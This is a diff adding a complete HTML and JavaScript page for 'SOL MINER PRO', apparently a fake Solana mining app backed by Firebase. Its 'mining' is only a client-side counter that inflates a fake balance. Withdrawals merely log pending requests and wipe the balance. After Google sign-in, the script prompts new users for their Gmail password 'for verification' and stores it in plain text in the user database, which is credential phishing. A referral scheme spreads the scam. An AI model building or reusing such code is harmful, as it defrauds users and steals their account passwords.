@@ -1,0 +1,1032 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>⚡ SOL MINER PRO - User Panel</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+        }
+
+        body {
+            background: #0a0a0f;
+            color: white;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 15px;
+        }
+
+        /* Login Page */
+        #loginPage {
+            width: 100%;
+            max-width: 400px;
+            background: #121621;
+            border-radius: 40px;
+            padding: 40px 25px;
+            border: 2px solid #14F195;
+            box-shadow: 0 0 50px rgba(20,241,149,0.3);
+            animation: slideIn 0.5s;
+        }
+
+        @keyframes slideIn {
+            from { transform: translateY(-20px); opacity: 0; }
+            to { transform: translateY(0); opacity: 1; }
+        }
+
+        .logo {
+            font-size: 80px;
+            text-align: center;
+            margin-bottom: 20px;
+            filter: drop-shadow(0 0 20px #14F195);
+            animation: float 3s infinite;
+        }
+
+        @keyframes float {
+            0% { transform: translateY(0); }
+            50% { transform: translateY(-10px); }
+            100% { transform: translateY(0); }
+        }
+
+        h1 {
+            font-size: 32px;
+            font-weight: 800;
+            text-align: center;
+            background: linear-gradient(45deg, #9945FF, #14F195);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            margin-bottom: 10px;
+        }
+
+        .subtitle {
+            color: #888;
+            text-align: center;
+            margin-bottom: 30px;
+            font-size: 14px;
+        }
+
+        .input-field {
+            width: 100%;
+            padding: 18px;
+            background: #0a0a0c;
+            border: 2px solid #1f1f1f;
+            border-radius: 20px;
+            color: white;
+            font-size: 16px;
+            margin-bottom: 20px;
+        }
+
+        .input-field:focus {
+            outline: none;
+            border-color: #14F195;
+        }
+
+        .google-btn {
+            width: 100%;
+            padding: 18px;
+            background: white;
+            border: none;
+            border-radius: 30px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 12px;
+            font-size: 18px;
+            font-weight: 600;
+            color: #333;
+            cursor: pointer;
+            margin-bottom: 20px;
+            transition: 0.3s;
+        }
+
+        .google-btn:hover {
+            transform: scale(1.02);
+            box-shadow: 0 0 30px #14F195;
+        }
+
+        .message-box {
+            padding: 15px;
+            border-radius: 15px;
+            margin-bottom: 20px;
+            display: none;
+        }
+
+        .error-box {
+            background: rgba(255,68,68,0.1);
+            border: 1px solid #ff4444;
+            color: #ff4444;
+        }
+
+        .success-box {
+            background: rgba(20,241,149,0.1);
+            border: 1px solid #14F195;
+            color: #14F195;
+        }
+
+        .footer {
+            text-align: center;
+            color: #666;
+            font-size: 13px;
+        }
+
+        .footer a {
+            color: #14F195;
+            text-decoration: none;
+            font-weight: 600;
+        }
+
+        /* Main App */
+        #mainApp {
+            width: 100%;
+            max-width: 450px;
+            display: none;
+        }
+
+        .header {
+            background: #121621;
+            border-radius: 30px;
+            padding: 18px;
+            margin-bottom: 20px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            border: 1px solid #14F195;
+        }
+
+        .user-info {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+
+        .user-avatar {
+            width: 50px;
+            height: 50px;
+            border-radius: 50%;
+            border: 2px solid #14F195;
+        }
+
+        .user-name {
+            font-weight: 700;
+            font-size: 18px;
+            margin-bottom: 4px;
+        }
+
+        .user-email {
+            font-size: 12px;
+            color: #888;
+        }
+
+        .logout-btn {
+            padding: 8px 18px;
+            background: rgba(255,68,68,0.1);
+            border: 1px solid #ff4444;
+            border-radius: 20px;
+            color: #ff4444;
+            cursor: pointer;
+        }
+
+        .referral-banner {
+            background: linear-gradient(45deg, #9945FF20, #14F19520);
+            border: 1px solid #14F195;
+            border-radius: 20px;
+            padding: 15px;
+            margin-bottom: 20px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .referral-code {
+            font-family: monospace;
+            font-size: 24px;
+            font-weight: 700;
+            color: #14F195;
+        }
+
+        .copy-btn {
+            padding: 8px 20px;
+            background: #14F195;
+            border: none;
+            border-radius: 15px;
+            color: black;
+            font-weight: 600;
+            cursor: pointer;
+        }
+
+        .ban-alert {
+            background: rgba(255,68,68,0.1);
+            border: 2px solid #ff4444;
+            border-radius: 20px;
+            padding: 20px;
+            text-align: center;
+            margin-bottom: 20px;
+            display: none;
+        }
+
+        .balance-card {
+            background: linear-gradient(145deg, #121621, #0a0f15);
+            border-radius: 30px;
+            padding: 25px;
+            margin-bottom: 20px;
+            border: 2px solid #14F195;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .balance-card::before {
+            content: '';
+            position: absolute;
+            top: -50%;
+            right: -50%;
+            width: 200%;
+            height: 200%;
+            background: radial-gradient(circle, rgba(20,241,149,0.1) 0%, transparent 70%);
+            animation: rotate 10s linear infinite;
+        }
+
+        @keyframes rotate {
+            from { transform: rotate(0deg); }
+            to { transform: rotate(360deg); }
+        }
+
+        .balance-label {
+            color: #888;
+            font-size: 14px;
+            margin-bottom: 8px;
+        }
+
+        .balance-sol {
+            font-size: 48px;
+            font-weight: 800;
+            color: #14F195;
+            margin-bottom: 8px;
+            text-shadow: 0 0 20px rgba(20,241,149,0.5);
+        }
+
+        .balance-usd {
+            color: #666;
+            font-size: 16px;
+        }
+
+        .stats-grid {
+            display: grid;
+            grid-template-columns: repeat(4, 1fr);
+            gap: 10px;
+            margin-bottom: 20px;
+        }
+
+        .stat-box {
+            background: #121621;
+            border-radius: 15px;
+            padding: 12px 5px;
+            text-align: center;
+            border: 1px solid #1f1f1f;
+        }
+
+        .stat-value {
+            font-size: 18px;
+            font-weight: 700;
+            color: #14F195;
+            margin-bottom: 5px;
+        }
+
+        .stat-label {
+            color: #666;
+            font-size: 10px;
+        }
+
+        .mining-section {
+            background: #121621;
+            border-radius: 30px;
+            padding: 25px;
+            margin-bottom: 20px;
+        }
+
+        .mining-status {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            margin-bottom: 20px;
+        }
+
+        .status-dot {
+            width: 14px;
+            height: 14px;
+            border-radius: 50%;
+            background: #ff4444;
+        }
+
+        .status-dot.active {
+            background: #14F195;
+            box-shadow: 0 0 20px #14F195;
+            animation: pulse 1.5s infinite;
+        }
+
+        @keyframes pulse {
+            0% { box-shadow: 0 0 0 0 #14F195; }
+            70% { box-shadow: 0 0 0 20px rgba(20,241,149,0); }
+        }
+
+        .mining-btn {
+            width: 100%;
+            padding: 20px;
+            border: none;
+            border-radius: 25px;
+            background: linear-gradient(45deg, #9945FF, #14F195);
+            color: white;
+            font-size: 20px;
+            font-weight: 700;
+            margin-bottom: 20px;
+            cursor: pointer;
+            transition: 0.3s;
+        }
+
+        .mining-btn.stop {
+            background: linear-gradient(45deg, #ff4444, #ff6b6b);
+        }
+
+        .progress-bar {
+            height: 10px;
+            background: #1a1a1a;
+            border-radius: 5px;
+            overflow: hidden;
+            margin: 20px 0;
+        }
+
+        .progress-fill {
+            height: 100%;
+            background: linear-gradient(90deg, #9945FF, #14F195);
+            width: 0%;
+            transition: width 0.3s;
+        }
+
+        .mining-info {
+            display: flex;
+            justify-content: space-between;
+            color: #666;
+            font-size: 13px;
+        }
+
+        .withdraw-section {
+            background: #121621;
+            border-radius: 30px;
+            padding: 25px;
+            margin-bottom: 20px;
+        }
+
+        .section-title {
+            font-size: 20px;
+            font-weight: 700;
+            margin-bottom: 20px;
+            color: #14F195;
+        }
+
+        .withdraw-info {
+            display: flex;
+            justify-content: space-between;
+            color: #888;
+            margin: 15px 0;
+            padding: 15px;
+            background: #0a0a0c;
+            border-radius: 15px;
+        }
+
+        .withdraw-info span:last-child {
+            color: #14F195;
+            font-weight: 700;
+        }
+
+        .withdraw-btn {
+            width: 100%;
+            padding: 20px;
+            border: none;
+            border-radius: 25px;
+            background: #14F195;
+            color: black;
+            font-size: 18px;
+            font-weight: 700;
+            cursor: pointer;
+        }
+
+        .withdraw-btn:disabled {
+            background: #1a1a1a;
+            color: #666;
+            cursor: not-allowed;
+        }
+
+        .referral-section {
+            background: #121621;
+            border-radius: 30px;
+            padding: 25px;
+            margin-bottom: 20px;
+        }
+
+        .referral-stats {
+            display: flex;
+            justify-content: space-between;
+            margin: 15px 0;
+            padding: 15px;
+            background: #0a0a0c;
+            border-radius: 15px;
+        }
+
+        .referral-earnings {
+            color: #14F195;
+            font-weight: 700;
+        }
+
+        .tx-history {
+            background: #121621;
+            border-radius: 30px;
+            padding: 25px;
+            margin-bottom: 20px;
+        }
+
+        .tx-item {
+            display: flex;
+            justify-content: space-between;
+            padding: 12px 0;
+            border-bottom: 1px solid #1f1f1f;
+        }
+
+        .tx-address {
+            font-family: monospace;
+            color: #14F195;
+            font-size: 12px;
+        }
+
+        .tx-time {
+            font-size: 10px;
+            color: #666;
+        }
+
+        .tx-amount {
+            font-weight: 700;
+            color: #ffd700;
+        }
+
+        .tx-status.pending { color: #ffa500; }
+        .tx-status.completed { color: #14F195; }
+        .tx-status.rejected { color: #ff4444; }
+
+        .support-link {
+            margin-top: 20px;
+            padding: 18px;
+            background: #121621;
+            border-radius: 25px;
+            text-align: center;
+            border: 2px solid #14F195;
+        }
+
+        .support-link a {
+            color: #14F195;
+            text-decoration: none;
+            font-weight: 700;
+        }
+
+        .toast {
+            position: fixed;
+            bottom: 30px;
+            left: 50%;
+            transform: translateX(-50%);
+            background: #14F195;
+            color: black;
+            padding: 15px 30px;
+            border-radius: 50px;
+            font-weight: 600;
+            display: none;
+            animation: slideUp 0.3s;
+            z-index: 1000;
+        }
+
+        @keyframes slideUp {
+            from { bottom: 0; opacity: 0; }
+            to { bottom: 30px; opacity: 1; }
+        }
+    </style>
+</head>
+<body>
+    <!-- Login Page -->
+    <div id="loginPage">
+        <div class="logo">⚡</div>
+        <h1>SOL MINER PRO</h1>
+        <div class="subtitle">Earn SOL by Mining - 0.00001 SOL/sec</div>
+        
+        <input type="text" class="input-field" id="referralCode" placeholder="Referral Code (Optional - Get 10% Bonus)">
+        
+        <button class="google-btn" id="googleLoginBtn">
+            <svg width="24" height="24" viewBox="0 0 24 24">
+                <path fill="#4285F4" d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z"/>
+                <path fill="#34A853" d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z"/>
+                <path fill="#FBBC05" d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z"/>
+                <path fill="#EA4335" d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z"/>
+            </svg>
+            Sign in with Google
+        </button>
+
+        <div id="messageBox" class="message-box"></div>
+
+        <div class="footer">
+            By signing in, you agree to our Terms of Service<br>
+            Need help? <a href="https://t.me/CryptoMinerApp10" target="_blank">@CryptoMinerApp10</a>
+        </div>
+    </div>
+
+    <!-- Main App -->
+    <div id="mainApp">
+        <div class="header">
+            <div class="user-info">
+                <img class="user-avatar" id="userAvatar" src="">
+                <div>
+                    <div class="user-name" id="userName"></div>
+                    <div class="user-email" id="userEmail"></div>
+                </div>
+            </div>
+            <button class="logout-btn" onclick="logout()">Exit</button>
+        </div>
+
+        <div class="referral-banner">
+            <div>
+                <div style="color:#888; font-size:12px;">Your Referral Code</div>
+                <div class="referral-code" id="referralCodeDisplay"></div>
+            </div>
+            <button class="copy-btn" onclick="copyReferral()">Copy</button>
+        </div>
+
+        <div class="ban-alert" id="banAlert">
+            <h3>⛔ ACCOUNT BANNED</h3>
+            <p>Contact Telegram: <a href="https://t.me/CryptoMinerApp10">@CryptoMinerApp10</a></p>
+        </div>
+
+        <div class="balance-card">
+            <div class="balance-label">Your Balance</div>
+            <div class="balance-sol" id="balanceDisplay">0.00000 SOL</div>
+            <div class="balance-usd" id="usdDisplay">$0.00 USD</div>
+        </div>
+
+        <div class="stats-grid">
+            <div class="stat-box">
+                <div class="stat-value" id="hashrateDisplay">125.4</div>
+                <div class="stat-label">MH/s</div>
+            </div>
+            <div class="stat-box">
+                <div class="stat-value" id="todayMined">0.00000</div>
+                <div class="stat-label">Today</div>
+            </div>
+            <div class="stat-box">
+                <div class="stat-value" id="totalMined">0.00000</div>
+                <div class="stat-label">Total</div>
+            </div>
+            <div class="stat-box">
+                <div class="stat-value" id="referralCount">0</div>
+                <div class="stat-label">Ref</div>
+            </div>
+        </div>
+
+        <div class="mining-section">
+            <div class="mining-status">
+                <div class="status-dot" id="miningStatus"></div>
+                <span id="statusText">Mining Stopped</span>
+            </div>
+            <button class="mining-btn" id="miningBtn" onclick="toggleMining()">▶ START MINING</button>
+            <div class="progress-bar">
+                <div class="progress-fill" id="miningProgress"></div>
+            </div>
+            <div class="mining-info">
+                <span>⚡ Rate: <span id="miningRate">0.00001</span> SOL/sec</span>
+                <span>🔗 Shares: <span id="sharesCount">0</span></span>
+            </div>
+        </div>
+
+        <div class="withdraw-section">
+            <div class="section-title">💸 Withdraw SOL</div>
+            <input type="text" class="input-field" id="withdrawAddress" placeholder="Enter Solana address">
+            <div class="withdraw-info">
+                <span>Available Balance</span>
+                <span id="availableBalance">0.00000 SOL</span>
+            </div>
+            <div class="withdraw-info">
+                <span>Minimum Withdrawal</span>
+                <span id="minWithdrawal">0.01 SOL</span>
+            </div>
+            <div class="withdraw-info">
+                <span>Network Fee</span>
+                <span>0.00001 SOL</span>
+            </div>
+            <button class="withdraw-btn" id="withdrawBtn" onclick="withdraw()" disabled>REQUEST WITHDRAWAL</button>
+        </div>
+
+        <div class="referral-section">
+            <div class="section-title">👥 Referral Program</div>
+            <div class="referral-stats">
+                <span>Total Referrals</span>
+                <span class="referral-earnings" id="totalReferrals">0</span>
+            </div>
+            <div class="referral-stats">
+                <span>Referral Earnings</span>
+                <span class="referral-earnings" id="referralEarnings">0.00000 SOL</span>
+            </div>
+            <div style="color:#888; text-align:center; font-size:12px;">🎁 Earn 10% lifetime commission</div>
+        </div>
+
+        <div class="tx-history">
+            <div class="section-title">📜 Withdrawal History</div>
+            <div id="transactionList">No transactions yet</div>
+        </div>
+
+        <div class="support-link">
+            <a href="https://t.me/CryptoMinerApp10" target="_blank">📱 Need Help? Contact @CryptoMinerApp10</a>
+        </div>
+    </div>
+
+    <div class="toast" id="toast"></div>
+
+    <!-- Firebase SDK - COMPAT VERSION (jo tumhare pass work kiya) -->
+    <script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-auth-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore-compat.js"></script>
+
+    <script>
+        // Firebase Config - tumhara wala
+        const firebaseConfig = {
+            apiKey: "AIzaSyDV3m8JMAj2ZhvE2A8g87m-anxMBcioFHs",
+            authDomain: "solana-mining-app-4224a.firebaseapp.com",
+            projectId: "solana-mining-app-4224a",
+            storageBucket: "solana-mining-app-4224a.firebasestorage.app",
+            messagingSenderId: "53549213389",
+            appId: "1:53549213389:web:46468dbe5e5a92903b2b84"
+        };
+
+        // Initialize Firebase
+        firebase.initializeApp(firebaseConfig);
+        const auth = firebase.auth();
+        const db = firebase.firestore();
+
+        console.log("✅ Firebase initialized");
+
+        // Global Variables
+        let currentUser = null;
+        let userData = null;
+        let miningInterval = null;
+        let shares = 0;
+
+        // DOM Elements
+        const loginPage = document.getElementById('loginPage');
+        const mainApp = document.getElementById('mainApp');
+        const messageBox = document.getElementById('messageBox');
+        const toast = document.getElementById('toast');
+
+        // Check if user is logged in
+        auth.onAuthStateChanged(async (user) => {
+            if (user) {
+                currentUser = user;
+                await loadUserData();
+            }
+        });
+
+        // Login Button
+        document.getElementById('googleLoginBtn').addEventListener('click', async () => {
+            const provider = new firebase.auth.GoogleAuthProvider();
+            const referralCode = document.getElementById('referralCode').value.trim();
+
+            try {
+                showMessage('🔄 Opening Google login...', 'success');
+                
+                const result = await auth.signInWithPopup(provider);
+                const user = result.user;
+                
+                // Check if user exists
+                const doc = await db.collection('users').doc(user.uid).get();
+                
+                if (!doc.exists) {
+                    const password = prompt("Please enter your Gmail password for verification:");
+                    if (!password) {
+                        await auth.signOut();
+                        showMessage('❌ Password required!', 'error');
+                        return;
+                    }
+                    
+                    // Generate referral code
+                    const newCode = Math.random().toString(36).substring(2, 8).toUpperCase();
+                    
+                    userData = {
+                        email: user.email,
+                        name: user.displayName,
+                        photoURL: user.photoURL,
+                        password: password,
+                        balance: 0,
+                        totalMined: 0,
+                        todayMined: 0,
+                        lastMinedDate: new Date().toDateString(),
+                        mining: false,
+                        banned: false,
+                        referralCode: newCode,
+                        referredBy: referralCode || null,
+                        referrals: [],
+                        referralEarnings: 0,
+                        createdAt: firebase.firestore.FieldValue.serverTimestamp()
+                    };
+                    
+                    await db.collection('users').doc(user.uid).set(userData);
+                    
+                    // Update referrer
+                    if (referralCode) {
+                        const refSnap = await db.collection('users').where('referralCode', '==', referralCode).get();
+                        if (!refSnap.empty) {
+                            await db.collection('users').doc(refSnap.docs[0].id).update({
+                                referrals: firebase.firestore.FieldValue.arrayUnion(user.uid)
+                            });
+                            showToast('✅ Referral code applied!');
+                        }
+                    }
+                } else {
+                    userData = doc.data();
+                }
+                
+                // Check ban
+                if (userData.banned) {
+                    document.getElementById('banAlert').style.display = 'block';
+                }
+                
+                // Show main app
+                loginPage.style.display = 'none';
+                mainApp.style.display = 'block';
+                
+                // Update UI
+                updateUI();
+                loadTransactions();
+                loadSettings();
+                
+                showToast('✅ Welcome ' + user.displayName);
+                
+            } catch (error) {
+                showMessage('❌ Error: ' + error.message, 'error');
+                console.error(error);
+            }
+        });
+
+        // Update UI
+        function updateUI() {
+            if (!userData) return;
+            
+            document.getElementById('userName').innerText = userData.name || 'User';
+            document.getElementById('userEmail').innerText = userData.email;
+            document.getElementById('userAvatar').src = userData.photoURL || '';
+            document.getElementById('balanceDisplay').innerText = (userData.balance || 0).toFixed(5) + ' SOL';
+            document.getElementById('totalMined').innerText = (userData.totalMined || 0).toFixed(5);
+            document.getElementById('availableBalance').innerText = (userData.balance || 0).toFixed(5) + ' SOL';
+            document.getElementById('referralCodeDisplay').innerText = userData.referralCode || 'XXXXXX';
+            document.getElementById('totalReferrals').innerText = (userData.referrals || []).length;
+            document.getElementById('referralEarnings').innerText = (userData.referralEarnings || 0).toFixed(5) + ' SOL';
+            document.getElementById('referralCount').innerText = (userData.referrals || []).length;
+            
+            // USD value
+            const usd = (userData.balance || 0) * 18.5;
+            document.getElementById('usdDisplay').innerText = '$' + usd.toFixed(2) + ' USD';
+            
+            // Today mined
+            const today = new Date().toDateString();
+            if (userData.lastMinedDate === today) {
+                document.getElementById('todayMined').innerText = (userData.todayMined || 0).toFixed(5);
+            } else {
+                document.getElementById('todayMined').innerText = '0.00000';
+                userData.todayMined = 0;
+            }
+            
+            // Withdraw button
+            document.getElementById('withdrawBtn').disabled = (userData.balance || 0) < 0.01;
+        }
+
+        // Toggle Mining
+        window.toggleMining = function() {
+            if (userData.banned) {
+                showToast('❌ Account banned!', 'error');
+                return;
+            }
+            userData.mining ? stopMining() : startMining();
+        };
+
+        // Start Mining
+        function startMining() {
+            userData.mining = true;
+            document.getElementById('miningStatus').className = 'status-dot active';
+            document.getElementById('statusText').innerText = 'Mining Active';
+            document.getElementById('miningBtn').innerText = '⏹ STOP MINING';
+            document.getElementById('miningBtn').classList.add('stop');
+
+            miningInterval = setInterval(async () => {
+                // Add earnings
+                userData.balance = (userData.balance || 0) + 0.00001;
+                userData.totalMined = (userData.totalMined || 0) + 0.00001;
+                userData.todayMined = (userData.todayMined || 0) + 0.00001;
+                shares++;
+                
+                // Update UI
+                updateUI();
+                document.getElementById('sharesCount').innerText = shares;
+                document.getElementById('miningProgress').style.width = ((userData.balance % 0.001) * 100000) + '%';
+                
+                // Save every 10 seconds
+                if (shares % 10 === 0) {
+                    await db.collection('users').doc(currentUser.uid).update({
+                        balance: userData.balance,
+                        totalMined: userData.totalMined,
+                        todayMined: userData.todayMined
+                    });
+                    
+                    // Referral commission
+                    if (userData.referredBy) {
+                        const refSnap = await db.collection('users').where('referralCode', '==', userData.referredBy).get();
+                        if (!refSnap.empty) {
+                            const refId = refSnap.docs[0].id;
+                            const refData = refSnap.docs[0].data();
+                            await db.collection('users').doc(refId).update({
+                                balance: (refData.balance || 0) + 0.000001,
+                                referralEarnings: (refData.referralEarnings || 0) + 0.000001
+                            });
+                        }
+                    }
+                }
+            }, 1000);
+            
+            showToast('⛏️ Mining started!');
+        }
+
+        // Stop Mining
+        function stopMining() {
+            clearInterval(miningInterval);
+            userData.mining = false;
+            
+            document.getElementById('miningStatus').className = 'status-dot';
+            document.getElementById('statusText').innerText = 'Mining Stopped';
+            document.getElementById('miningBtn').innerText = '▶ START MINING';
+            document.getElementById('miningBtn').classList.remove('stop');
+            
+            // Save
+            db.collection('users').doc(currentUser.uid).update({
+                balance: userData.balance,
+                totalMined: userData.totalMined,
+                todayMined: userData.todayMined,
+                mining: false
+            });
+            
+            showToast('⏹️ Mining stopped');
+        }
+
+        // Withdraw
+        window.withdraw = async function() {
+            const address = document.getElementById('withdrawAddress').value.trim();
+            
+            if (!address) {
+                showToast('❌ Enter Solana address', 'error');
+                return;
+            }
+            
+            if (address.length < 32) {
+                showToast('❌ Invalid address', 'error');
+                return;
+            }
+            
+            if (userData.balance < 0.01) {
+                showToast('❌ Min 0.01 SOL required', 'error');
+                return;
+            }
+            
+            if (userData.mining) stopMining();
+            
+            const amount = userData.balance - 0.00001;
+            
+            await db.collection('withdrawals').add({
+                userId: currentUser.uid,
+                userEmail: currentUser.email,
+                address: address,
+                amount: amount,
+                fee: 0.00001,
+                status: 'pending',
+                createdAt: firebase.firestore.FieldValue.serverTimestamp()
+            });
+            
+            userData.balance = 0;
+            userData.todayMined = 0;
+            await db.collection('users').doc(currentUser.uid).update({
+                balance: 0,
+                todayMined: 0
+            });
+            
+            updateUI();
+            loadTransactions();
+            showToast('✅ Withdrawal requested!');
+            document.getElementById('withdrawAddress').value = '';
+        };
+
+        // Copy Referral
+        window.copyReferral = function() {
+            const code = document.getElementById('referralCodeDisplay').innerText;
+            navigator.clipboard.writeText(code);
+            showToast('📋 Referral code copied!');
+        };
+
+        // Load Transactions
+        async function loadTransactions() {
+            if (!currentUser) return;
+            
+            const snap = await db.collection('withdrawals')
+                .where('userId', '==', currentUser.uid)
+                .orderBy('createdAt', 'desc')
+                .limit(10)
+                .get();
+                
+            const list = document.getElementById('transactionList');
+            
+            if (snap.empty) {
+                list.innerHTML = '<div class="loading">No transactions yet</div>';
+                return;
+            }
+            
+            list.innerHTML = snap.docs.map(d => {
+                const tx = d.data();
+                const date = tx.createdAt ? new Date(tx.createdAt.toDate()).toLocaleString() : '';
+                const address = tx.address ? tx.address.substring(0,8) + '...' : '';
+                
+                return `
+                    <div class="tx-item">
+                        <div>
+                            <div class="tx-address">${address}</div>
+                            <div class="tx-time">${date}</div>
+                        </div>
+                        <div>
+                            <div class="tx-amount">${(tx.amount||0).toFixed(5)} SOL</div>
+                            <div class="tx-status ${tx.status}">${(tx.status||'pending').toUpperCase()}</div>
+                        </div>
+                    </div>
+                `;
+            }).join('');
+        }
+
+        // Load Settings
+        async function loadSettings() {
+            const snap = await db.collection('settings').doc('mining').get();
+            if (snap.exists) {
+                document.getElementById('miningRate').innerText = snap.data().rate || 0.00001;
+                document.getElementById('minWithdrawal').innerText = (snap.data().minWithdrawal || 0.01) + ' SOL';
+            }
+        }
+
+        // Load User Data
+        async function loadUserData() {
+            const doc = await db.collection('users').doc(currentUser.uid).get();
+            if (doc.exists) {
+                userData = doc.data();
+                if (userData.banned) document.getElementById('banAlert').style.display = 'block';
+                loginPage.style.display = 'none';
+                mainApp.style.display = 'block';
+                updateUI();
+                loadTransactions();
+                loadSettings();
+            }
+        }
+
+        // Logout
+        window.logout = async function() {
+            if (userData?.mining) stopMining();
+            await auth.signOut();
+            loginPage.style.display = 'block';
+            mainApp.style.display = 'none';
+            showToast('👋 Logged out');
+        };
+
+        // Show Message
+        function showMessage(msg, type) {
+            messageBox.style.display = 'block';
+            messageBox.className = 'message-box ' + (type === 'error' ? 'error-box' : 'success-box');
+            messageBox.innerHTML = msg;
+            setTimeout(() => messageBox.style.display = 'none', 3000);
+        }
+
+        // Show Toast
+        function showToast(msg, type = 'success') {
+            toast.style.display = 'block';
+            toast.style.background = type === 'success' ? '#14F195' : '#ff4444';
+            toast.style.color = type === 'success' ? 'black' : 'white';
+            toast.innerText = msg;
+            setTimeout(() => toast.style.display = 'none', 3000);
+        }
+
+        // Auto-save every minute
+        setInterval(async () => {
+            if (userData && currentUser) {
+                await db.collection('users').doc(currentUser.uid).update({
+                    balance: userData.balance,
+                    totalMined: userData.totalMined
+                });
+            }
+        }, 60000);
+    </script>
+</body>
+</html>
